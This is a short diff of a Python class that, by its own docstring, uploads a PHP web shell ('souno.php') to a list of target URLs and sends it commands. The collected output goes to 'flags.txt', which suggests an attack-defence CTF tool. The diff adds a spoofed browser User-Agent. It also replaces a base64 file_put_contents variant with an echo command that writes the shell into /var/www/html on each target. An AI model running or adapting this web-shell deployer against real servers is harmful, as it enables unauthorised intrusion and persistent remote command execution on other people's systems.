@@ -11,7 +11,10 @@ from ip_manager import IPManager
 class PHPConnectionTester:
     URLS_FILE: str = "urls.txt"
     OUTPUT_FILE: str = "flags.txt"
-    HEADERS: dict = {'Content-Type': 'application/x-www-form-urlencoded'}
+    HEADERS: dict = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
     PHP_FILE: str = 'shell/souno.php'
     SHELL_PATH: str = '/'
 
@@ -78,10 +81,7 @@ class PHPConnectionTester:
         将 PHP shell 上传到给定的 URL，然后向其发送命令。
         """
         ph = open(self.PHP_FILE, "r").read()
-        if use_system:
-            command = f'echo \'{ph}\' > /var/www/html{self.SHELL_PATH}souno.php'
-        else:
-            command = f"file_put_contents(\"/var/www/html{self.SHELL_PATH}souno.php\",base64_decode(\"{base64.b64encode(ph)}\"));"
+        command = f'echo \'{ph}\' > /var/www/html{self.SHELL_PATH}souno.php'
         try:
             with open(self.URLS_FILE, 'r') as file:
                 urls = [line.strip() for line in file if line.strip()]
